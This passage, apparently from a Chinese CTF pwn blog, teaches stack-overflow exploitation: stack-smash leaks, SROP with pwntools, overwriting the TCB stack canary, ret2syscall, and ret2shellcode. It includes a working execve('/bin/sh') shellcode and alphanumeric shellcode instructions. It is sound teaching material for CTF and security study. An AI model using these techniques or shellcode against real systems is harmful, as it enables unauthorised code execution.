class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class=\"number\">0x40</span>], xmm0</span><br></pre></td></tr></table></figure>\n<p>说明是栈对齐的原因，小心调整栈帧就行</p>\n<h4 id=\"Stack-smash\">Stack smash</h4>\n<p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p>\n<p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p>\n<h4 id=\"SROP\">SROP</h4>\n<h5 id=\"前置知识-2\">前置知识:</h5>\n<p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p>\n<p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p>\n<p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p>\n<p>SROP简要流程:</p>\n<ol>\n<li>构造fake_frame</li>\n<li>控制当前rsp指向fake_frame底部</li>\n<li>sigreturn调用</li>\n</ol>\n<p>sigFrame结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// x64</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        cwd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r8;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> cs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> gs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> fs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"type\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h5 id=\"pwntools-srop\">pwntools.srop</h5>\n<p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 一个简单的例子</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure>\n<h4 id=\"stack-gaurd\">stack_gaurd</h4>\n<p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a href=\"http://www.openwall.com/lists/oss-security/2018/02/27/5\">TCB</a> ， TCB结构如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *tcb;                <span class=\"comment\">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class=\"line\"><span class=\"comment\">                           thread descriptor used by libpthread.  */</span></span><br><span class=\"line\">  <span class=\"type\">dtv_t</span> *dtv;</span><br><span class=\"line\">  <span class=\"type\">void</span> *self;                <span class=\"comment\">/* Pointer to the thread descriptor.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> multiple_threads;</span><br><span class=\"line\">  <span class=\"type\">int</span> gscope_flag;  <span class=\"comment\">// not in 32bit</span></span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> sysinfo;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> stack_guard;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> pointer_guard;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> vgetcpu_cache[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class=\"line\"><span class=\"comment\">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> feature_1;</span><br><span class=\"line\">  <span class=\"type\">int</span> __glibc_unused1;</span><br><span class=\"line\">  <span class=\"comment\">/* Reservation of some values for the TM ABI.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__private_tm[<span class=\"number\">4</span>];</span><br><span class=\"line\">  <span class=\"comment\">/* GCC split stack support.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__private_ss;</span><br><span class=\"line\">  <span class=\"comment\">/* The lowest address of shadow stack,  */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> ssp_base;</span><br><span class=\"line\">  <span class=\"comment\">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class=\"line\"><span class=\"comment\">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class=\"line\">  __128bits __glibc_unused2[<span class=\"number\">8</span>][<span class=\"number\">4</span>] __attribute__ ((aligned (<span class=\"number\">32</span>)));</span><br><span class=\"line\">  <span class=\"type\">void</span> *__padding[<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125; <span class=\"type\">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>\n<p>0x28的偏移实际上是指向的stack_guard</p>\n<p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">pthread_t</span></span><br><span class=\"line\"><span class=\"title function_\">pthread_self</span> <span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">pthread_t</span>) THREAD_SELF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class=\"line\">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">             Start                End Perm     Size Offset File</span><br><span class=\"line\">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class=\"line\">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class=\"line\">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class=\"line\">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class=\"line\">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class=\"line\">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">p/x (void*)(pthread_self())</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure>\n<p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p>\n<p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p>\n","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":"<h3 id=\"杂谈\">杂谈</h3>\n<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p>\n<p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p>\n<p>怎么去看待栈溢出题呢?</p>\n<p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p>\n<p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p>\n<p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p>\n<p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p>\n<p>当拿到一个题目时，首先思考：</p>\n<p>是否有syscall----&gt;ret2syscall</p>\n<p>有可读可写内存空间吗----&gt;ret2shellcode</p>\n<p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p>\n<p>接下来，再分门别类谈:</p>\n<h3 id=\"0x1-ret2syscall\">0x1.ret2syscall</h3>\n<p>因为syscall属于相对简单的，暂且放在前面谈。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">%rax</th>\n<th style=\"text-align:left\">System call</th>\n<th style=\"text-align:left\">%rdi</th>\n<th style=\"text-align:left\">%rsi</th>\n<th style=\"text-align:left\">%rdx</th>\n<th style=\"text-align:left\">%r10</th>\n<th style=\"text-align:left\">%r8</th>\n<th style=\"text-align:left\">%r9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">59</td>\n<td style=\"text-align:left\">sys_execve</td>\n<td style=\"text-align:left\">const char *filename</td>\n<td style=\"text-align:left\">const char *const argv[]</td>\n<td style=\"text-align:left\">const char *const envp[]</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n</tr>\n</tbody>\n</table>\n<p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p>\n<p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p>\n<p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p>\n<p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p>\n<p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p>\n<p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p>\n<p><strong>例题:</strong></p>\n<p>ciscn_s_3</p>\n<h3 id=\"ret2shellcode\">ret2shellcode</h3>\n<h4 id=\"shellcode的书写\">shellcode的书写</h4>\n<p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。</p>\n<p>一个简单的shellcode例子:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class=\"line\">push <span class=\"number\">0x68</span></span><br><span class=\"line\">mov rax, <span class=\"number\">0x732f2f2f6e69622f</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi, rsp</span><br><span class=\"line\"><span class=\"comment\">// push argument array [&#x27;sh\\x00&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">// push b&#x27;sh\\x00&#x27; </span></span><br><span class=\"line\">push <span class=\"number\">0x1010101</span> ^ <span class=\"number\">0x6873</span></span><br><span class=\"line\">xor dword ptr [rsp], <span class=\"number\">0x1010101</span></span><br><span class=\"line\">xor esi, esi <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\">push rsi <span class=\"comment\">/* null terminate */</span></span><br><span class=\"line\">push <span class=\"number\">8</span></span><br><span class=\"line\">pop rsi</span><br><span class=\"line\">add rsi, rsp</span><br><span class=\"line\">push rsi <span class=\"comment\">/* &#x27;sh\\x00&#x27; */</span></span><br><span class=\"line\">mov rsi, rsp</span><br><span class=\"line\">xor edx, edx <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\"><span class=\"comment\">// call execve()</span></span><br><span class=\"line\">push SYS_execve <span class=\"comment\">/* 0x3b */</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p>\n<p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p>\n<p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>数据传送:</span><br><span class=\"line\">push/pop eax…</span><br><span class=\"line\">pusha/popa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>算术运算:</span><br><span class=\"line\">inc/dec eax…</span><br><span class=\"line\">sub al, 立即数</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">sub dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">sub word ptr [eax… + 立即数], si di</span><br><span class=\"line\">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">sub si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>逻辑运算:</span><br><span class=\"line\">and al, 立即数</span><br><span class=\"line\">and dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">and word ptr [eax… + 立即数], si di</span><br><span class=\"line\">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class=\"line\">and esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">and si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\">xor al, 立即数</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">xor dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">xor word ptr [eax… + 立即数], si di</span><br><span class=\"line\">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">xor si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>比较指令:</span><br><span class=\"line\">cmp al, 立即数</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">cmp word ptr [eax… + 立即数], si di</span><br><span class=\"line\">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">cmp si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span>转移指令:</span><br><span class=\"line\">push <span class=\"number\">56</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">cmp al, <span class=\"number\">43</span>h</span><br><span class=\"line\">jnz lable</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;=&gt; jmp lable</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>交换al, ah</span><br><span class=\"line\">push eax</span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">xor byte ptr [esp], ah <span class=\"comment\">// al ^= ah</span></span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">pop eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7.</span>清零:</span><br><span class=\"line\">push <span class=\"number\">44</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">sub al, <span class=\"number\">44</span>h ; eax = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">push esi</span><br><span class=\"line\">push esp</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">xor [eax], esi ; esi = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p>\n<p>一个例子(纯字母数字shellcode):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 